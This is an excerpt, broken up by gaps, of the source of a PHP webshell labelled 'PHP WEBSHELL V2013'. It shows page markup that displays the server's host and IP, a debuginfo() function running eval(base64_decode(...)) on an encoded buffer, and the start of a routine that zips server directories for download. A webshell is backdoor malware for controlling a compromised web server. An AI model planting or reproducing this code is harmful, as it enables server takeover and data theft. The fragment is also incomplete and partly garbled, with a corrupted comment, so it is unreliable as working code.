...
<title>PHP WEBSHELL V2013</title>
<style type="text/css">
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr class="head">
        <td><span style="float:right;"><a href="http://code.google.com/p/webshell-php/" target="_blank">PHP WEBSHELL V2013</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
    </tr>
    <tr class="alt1">
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
    ...
    Copyright (C) 2004-2013 <a href="http://code.google.com/p/webshell-php/" target="_blank">Php Webshell Management Team</a> All Rights Reserved.
</div>
</body>
</html>
...
function debuginfo() {
	...
	$fxbuff = ""; eval(base64_decode($fxbuff));
}
    ...
    function PHPZip($dir)    {
        if (@function_exists('gzcompress'))    {
            ...
            if (is_array($dir)) $filelist = $dir;
                ...
                $filelist=$this -> GetFileList($dir);//??????Å?
